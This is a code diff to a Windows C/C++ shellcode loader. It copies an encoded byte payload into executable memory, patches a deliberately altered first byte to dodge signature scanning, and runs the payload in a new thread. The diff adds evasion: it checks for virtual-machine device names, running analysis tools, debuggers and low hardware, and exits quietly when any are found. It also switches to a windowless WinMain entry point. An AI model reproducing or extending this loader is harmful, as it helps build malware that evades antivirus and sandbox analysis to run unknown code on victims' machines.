@@ -1,6 +1,8 @@
-#include <Windows.h>
-#include "AntiDebugging.h"
 #include "CheckHardware.h"
+#include "CheckDeviceNames.h"
+#include "CheckRunningProcesses.h"
+#include "AntiDebugging.h"
+#include <Windows.h>
 
 void Run()
 {
@@ -46,35 +48,28 @@ void Run()
 		"\xf2\xe3\x2e\x6f\xd3\xda\xba\xf5\x0f\x65\x13\x78\x3e\x12"
 		"\xec\x53\x93\xa2\xd1";
 
-	char first[] = "\x48"; // correct value
+	// Correct value
+	char first[] = "\x48";
 
 	PVOID pCode = VirtualAlloc(0, sizeof code, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	
+	// Replace bad byte
 	RtlCopyMemory(code, first, sizeof first);
 	RtlCopyMemory(pCode, code, sizeof code);
+	
 	DWORD threadID;
+	
 	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)pCode, NULL, 0, &threadID);
 	WaitForSingleObject(hThread, INFINITE);
 }
 
-void ShowMessageBox(LPCSTR text)
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
 {
-	//MessageBoxA(0, text, "STOPPED", MB_OK);
-}
-
-int main()
-{
-	if (!SystemHasSufficientHardware())
-	{
-		//ShowMessageBox("CPU/RAM/HDD check failed!");
-		return 0;
-	}
-
-	if (!checkAntiDebugging())
-	{
-		//ShowMessageBox("Anti-debugging check failed!");
-		return 0;
-	}
-
+	if (!SystemHasSufficientHardware() || 
+		SystemHasVmDeviceNames()       ||
+		AnalysisToolsRunning() || 
+		checkAntiDebugging()) return 0;
+	
 	Run();
 	return 0;
 }
